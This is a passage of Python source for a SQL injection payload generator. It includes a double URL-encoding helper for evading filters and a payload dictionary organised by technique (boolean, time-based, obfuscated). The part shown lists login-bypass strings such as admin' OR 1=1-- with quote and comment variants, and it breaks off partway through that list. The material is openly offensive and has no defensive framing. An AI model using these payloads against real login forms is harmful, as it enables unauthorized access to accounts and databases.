import json
import urllib.parse
from datetime import datetime

def double_url_encode(s):
    """Double URL encoding"""
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

def generate_payloads():
    payloads = {
        "boolean_true": [],
        "boolean_false": [],
        "time_based": [],
        "obfuscated": [],
        "metadata": {}
    }
    
    # ===== BOOLEAN TRUE PAYLOADS (Login Bypass) =====
    boolean_true_base = [
        # Basic OR 1=1
        ("admin' OR 1=1-- ", "OR 1=1 with single quote and comment"),
        ('admin" OR 1=1-- ', 'OR 1=1 with double quote and comment'),
        ("admin' OR 1=1#", "OR 1=1 with hash comment"),
        ("admin' OR 1=1/*", "OR 1=1 with block comment"),
